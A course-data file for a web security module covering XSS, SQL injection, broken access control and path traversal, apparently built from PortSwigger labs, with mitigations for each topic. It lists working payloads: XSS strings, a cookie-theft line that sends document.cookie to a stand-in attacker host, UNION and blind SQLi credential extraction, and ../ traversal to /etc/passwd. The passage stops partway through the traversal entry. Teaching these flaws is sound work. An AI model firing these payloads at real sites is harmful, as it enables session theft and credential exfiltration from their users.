    topics: [
      {
        id: "m9-1",
        moduleId: "m9",
        number: 109,
        title: "OWASP Top 10 Overview & Significance",
        type: "theory",
        week: 9,
        description:
          "Injection and related flaws happen when an application fails to separate untrusted input from the commands or queries it executes — like a vending machine that dispenses free snacks if you find a button combination it wasn't built to expect. The CWEs tracked across this module (CWE-79 XSS, CWE-89 SQLi, CWE-77 Command Injection, CWE-73 external control of file/path name, CWE-200/CWE-201 sensitive-data exposure, CWE-352 CSRF) recur across real breaches: SQL injection was the entry point for the 2014 Sony Pictures hack, in which the Lazarus Group exfiltrated unreleased films and employee data, and an unpatched, known-vulnerable Apache Struts component (CVE-2017-5638) let attackers steal 147 million records in the 2017 Equifax breach. Broken access control alone was found in 94% of applications tested, at an average incidence rate of 3.81% — making it one of the highest-prevalence weakness categories covered here. Every topic in this module traces back to the same five failure impacts and the same handful of fixes.",
        keyPoints: [
          "Common impacts of every injection-class vulnerability: data theft, authentication bypass, data manipulation, system compromise, information disclosure",
          "Named CWEs covered in this module: CWE-79 (XSS), CWE-89 (SQLi), CWE-77 (Command Injection), CWE-73 (external control of file/path name), CWE-200/CWE-201 (sensitive info exposure), CWE-352 (CSRF)",
          "Broken access control appeared in 94% of tested applications, average incidence rate 3.81% — the highest-prevalence class in this module",
          "Real breach: SQL injection in the 2014 Sony Pictures hack (Lazarus Group) exfiltrated unreleased movies and employee data",
          "Real breach: an unpatched, known-vulnerable Apache Struts component (CVE-2017-5638) let attackers steal 147 million records in the 2017 Equifax breach",
          "Universal mitigations threaded through every topic below: never trust user input, parameterized queries, context-aware output encoding, least privilege",
        ],
      },
      {
        id: "m9-2",
        moduleId: "m9",
        number: 110,
        title:
          "XSS - Reflected, Stored, DOM-based (theory + impact + payloads)",
        type: "theory",
        week: 9,
        description:
          "Cross-Site Scripting injects attacker JavaScript into a page so it runs in another user's browser, and the three flavours differ in where the untrusted data comes from and how long it survives. In the PortSwigger reflected-XSS lab, the search box echoes input like <h1>Hello world</h1> straight back into the page unencoded — confirmed by inspecting the rendered HTML — before the working exploit <script>alert(1)</script> fires; in the stored lab, posting <script>alert(document.cookie)</script> as a blog comment persists it server-side so it fires for every visitor who later loads that page, which is why stored XSS is described as capable of full account takeover. DOM-based XSS is different again: the vulnerable sink lives entirely in client-side JavaScript — a trackSearch(query) function calls document.write() with query read straight from location.search — so the fix is to break out of the resulting img src attribute rather than a script tag. Real attacks weaponize any of these to run cookie-theft code or redirect the victim's browser outright.",
        keyPoints: [
          "Reflected: payload comes from the current request; the PortSwigger lab confirms <h1>Hello world</h1> renders unencoded via page Inspect before injecting <script>alert(1)</script>",
          "Stored: <script>alert(document.cookie)</script> posted as a blog comment persists server-side and fires for every subsequent visitor — described as capable of 'complete user account takeover'",
          "DOM-based: vulnerable sink is document.write('<img src=\"/resources/images/tracker.gif?searchTerms=' + query + '\">') reading directly from location.search via URLSearchParams, with no validation or encoding",
          "DOM breakout payload \"><img src=x onerror=alert('XSS_doomed')> closes the existing src attribute, injects a new <img>, and fires JS via the onerror handler when the bogus image fails to load",
          "Real-world cookie-theft pattern: fetch('https://attacker-site.com/steal?cookies=' + document.cookie) or document.location='http://malicious-site.com/steal?cookie='+document.cookie",
          "Delivery vector for reflected XSS: a crafted link containing the payload sent via email or text — it only executes once the victim clicks it",
          "Mitigation grounded in the source material: avoid document.write(), sanitize with something like DOMPurify, HTML-escape output (html.escape()), apply a Content Security Policy",
        ],
        terminalCommands: [
          "<script>alert(1)</script>",
          "<script>alert(document.cookie)</script>",
          "<h1>Hello world</h1>",
          "\"><img src=x onerror=alert('XSS_doomed')>",
          "fetch('https://attacker-site.com/steal?cookies=' + document.cookie)",
        ],
      },
      {
        id: "m9-3",
        moduleId: "m9",
        number: 111,
        title: "SQL Injection - Manual & Using sqlmap",
        type: "theory",
        week: 9,
        description:
          "SQL Injection happens when unsanitized user input reaches a database query, and the source labs walk through all three major variants end to end. In the WHERE-clause lab, the query SELECT * FROM products WHERE category='Gifts' AND released=1 is bypassed by sending category=Gifts' OR 1=1-- through Burp Repeater (URL-encoded with Ctrl+U), turning it into an always-true OR that dumps unreleased products too. UNION-based injection requires first fingerprinting the column count by sending '+UNION+SELECT+NULL-- and adding NULLs one at a time until the SQL error disappears, then swapping two of those NULL placeholders for username and password to exfiltrate credentials directly in the response. Blind SQLi, used when there's no visible output, is solved by comparing true/false conditions on a TrackingId cookie, confirming the users table and administrator account with subqueries, then extracting the password length and each character via SUBSTRING and Burp Intruder with a Grep-Match on the 'Welcome back' string (or a WAITFOR DELAY time-based variant when there's no response difference at all). This class of bug is not theoretical: SQL injection vulnerabilities were the entry point for the 2014 Sony Pictures hack, in which the Lazarus Group exfiltrated unreleased films and employee data.",
        keyPoints: [
          "WHERE-clause bypass: ' OR 1=1 -- turns WHERE category='Gifts' AND released=1 into an always-true condition, exposing unreleased products (via Burp Repeater, URL-encoded with Ctrl+U)",
          "UNION-based: determine column count by incrementally sending '+UNION+SELECT+NULL--, then NULL,NULL--, etc. until the SQL error disappears",
          "UNION exfiltration once column count is known: ' UNION SELECT null, username, password FROM users-- returns credentials inline with normal results",
          "Boolean-blind SQLi: compare TrackingId=xyz' AND '1'='1 (true) against TrackingId=xyz' AND '1'='2 (false) via the 'Welcome back' message appearing/disappearing, then confirm the users table with (SELECT 'a' FROM users LIMIT 1)='a",
          "Character-by-character extraction: (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a run through Burp Intruder with a Grep-Match on 'Welcome back', one position and character at a time",
          "Time-based blind variant when there's no visible response difference at all: ' IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '00:00:05' --",
          "Automating extraction: a Python script using requests can loop ascii(SUBSTRING(password, i, 1)) over character codes 32-126 per position, far faster than manual Intruder runs",
          "Real-world impact: SQL injection was the entry vector for the 2014 Sony Pictures hack (Lazarus Group), used to exfiltrate unreleased films and employee data",
          "Mitigation: parameterized queries (cursor.execute(query, [username, password])) and stored procedures instead of string-concatenated SQL",
        ],
        terminalCommands: [
          "' OR 1=1 --",
          "' UNION SELECT null, username, password FROM users--",
          "' AND (SELECT 'a' FROM users LIMIT 1)='a",
          "Gifts' OR 1=1 --",
          "'+UNION+SELECT+NULL--",
          "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a",
          "' IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '00:00:05' --",
        ],
      },
      {
        id: "m9-4",
        moduleId: "m9",
        number: 112,
        title:
          "Broken Access Control - IDOR, Forced Browsing, Privilege Escalation",
        type: "theory",
        week: 9,
        description:
          "Broken access control happens when an app checks that you're logged in but not that you're allowed to do the specific thing you're asking for — and OWASP's own data shows it in 94% of tested applications, at an average incidence rate of 3.81%, making it the single most prevalent class in this curriculum. Vertical privilege escalation looks like a check such as if ($user->role == 'admin') that trusts a client-controllable role field instead of a server-verified one; horizontal privilege escalation looks like a route that fetches a user profile by id with no ownership check at all, so requesting another user's id returns their data. The PortSwigger IDOR lab makes this concrete: the live-chat 'View transcript' feature requests GET /download-transcript/2.txt, and simply requesting /download-transcript/1.txt instead returns another user's (Carlos's) transcript — which contains his password in plaintext, letting you log in as him. A second lab shows the 'unprotected functionality' variant: appending /robots.txt to the lab's base URL discloses a Disallow: /administrator-panel entry for a hidden admin page that was never actually access-controlled, just unlinked — navigating there directly and deleting the user Carlos solves the lab.",
        keyPoints: [
          "Vertical privilege escalation pattern: if ($user->role == 'admin') trusting a client-manipulable $user->role field instead of a server-verified session claim",
          "Horizontal privilege escalation pattern: a route returning another user's data with no check that the requester owns that id — e.g. GET /user/1234 leaking anyone's profile",
          "Real IDOR lab: chat transcript endpoint GET /download-transcript/2.txt; changing the number to /download-transcript/1.txt retrieves another user's (Carlos's) transcript containing his plaintext password",
          "Real unprotected-admin-functionality lab: GET /robots.txt discloses Disallow: /administrator-panel — an admin path that was hidden, not actually authenticated — reachable and exploitable (delete user Carlos) without ever logging in as admin",
          "Prevalence: broken access control appeared in 94% of applications tested, average incidence rate 3.81% (the highest-prevalence weakness class covered in this module)",
          "Simple IDOR pattern: www.shop.com/receipt/12345 -> attacker tries www.shop.com/receipt/12346 if the server doesn't verify the requester owns that receipt",
          "Related CWEs: CWE-200 (exposure of sensitive info to an unauthorized actor), CWE-201 (insertion of sensitive info into sent data), CWE-352 (CSRF)",
          "Mitigation: use unpredictable indirect references instead of sequential IDs/filenames, enforce server-side ownership checks at every access point, never rely on an unlinked URL as a security boundary",
        ],
        terminalCommands: [
          "GET /download-transcript/2.txt",
          "GET /download-transcript/1.txt",
          "GET /robots.txt",
          "www.shop.com/receipt/12346",
        ],
      },
      {
        id: "m9-5",
        moduleId: "m9",
        number: 113,
        title: "Path Traversal / Directory Traversal",
        type: "theory",
        week: 9,
        description:
          "Path traversal exploits a file path built directly from unvalidated user input, letting an attacker walk out of the intended directory with ../ sequences. The vulnerable pattern is a one-liner — $path = \"/var/www/html/uploads/\" . $_GET['file']; readfile($path); — and the PortSwigger lab exploits exactly this: the image endpoint /image?filename=10.jpg is intercepted in Burp Repeater and the filename parameter is changed to ../../../etc/passwd (adding ../ segments until the right directory depth is reached), returning the contents of the server's /etc/passwd file in the response. The same class of bug appears generically as http://example.com/download.php?file=../../../../etc/passwd — a classic payload against any endpoint that concatenates user input onto a base path without validation. Beyond reading /etc/passwd, the same flaw can expose configuration files, credentials, or source code, any of which can feed into further compromise.",
        keyPoints: [
          "Vulnerable pattern: $path = \"/var/www/html/uploads/\" . $_GET['file']; readfile($path); — unsafe string concatenation with no validation",
          "Real PortSwigger lab: image endpoint /image?filename=10.jpg; modifying filename to ../../../etc/passwd in Burp Repeater (increasing ../ depth until correct) returns /etc/passwd's contents",
          "Generic classic payload: http://example.com/download.php?file=../../../../etc/passwd",
          "Impact: exposes sensitive files (config files, password files, source code) that can enable further privilege escalation",
          "Mitigation: whitelist valid filenames/patterns, normalize/canonicalize the resolved path, and restrict it to a fixed base directory before any file operation",
          "Mitigation: apply least-privilege file permissions so even a successful traversal can't reach files the app process shouldn't be able to read",
        ],
        terminalCommands: [
